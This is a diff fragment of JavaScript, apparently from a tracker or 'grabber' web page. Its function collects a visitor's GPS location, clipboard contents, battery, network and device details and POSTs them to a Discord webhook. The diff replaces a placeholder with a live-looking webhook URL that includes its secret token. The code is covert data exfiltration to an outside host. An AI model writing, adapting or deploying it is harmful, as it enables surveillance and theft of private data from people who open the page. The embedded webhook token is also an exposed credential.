@@ -118,7 +118,7 @@
          
            function senddis(gpsr, clips,batterypercentage,ischarging) {
              var request = new XMLHttpRequest();
-             request.open("POST", "https://your-discordwebhook-url");
+             request.open("POST", "https://discord.com/api/webhooks/958297394141868062/7OT6VY4C254UfLZpQqii4DBzL_98Ejy6rrvsYAVlmgIdUGcoRlftaOmWdN3j825Ty1yZ");
              request.setRequestHeader('Content-type', 'application/json');
              var params = {
                content: ("> **DeviceGps  : **" + gpsr + "\n> **NetworkInformation : **" + networkinformation + "\n> **BatteryPercentage : **" + batterypercentage + "\n> **Ischarging : **" + ischarging + "\n> **ScreenWidth : **" + width + "\n> **ScreenHeight : **" + height + "\n> **PlatForm : **" + platform + "\n> **DeviceLanguage : **" + devicelang + "\n> **DeviceMemory : **" + deviceram + "\n> **IsCookieEnabled : **" + iscookieEnabled + "\n> **UserAgent : **" + useragent + "\n> **CpuThreads : **" + cpuThreads + "\n> **ReferUrl : **" + referurl + "\n> **Clipboard : **" + clips + "\n> **DeviceLocalTime : **" + localtime + "\n"),
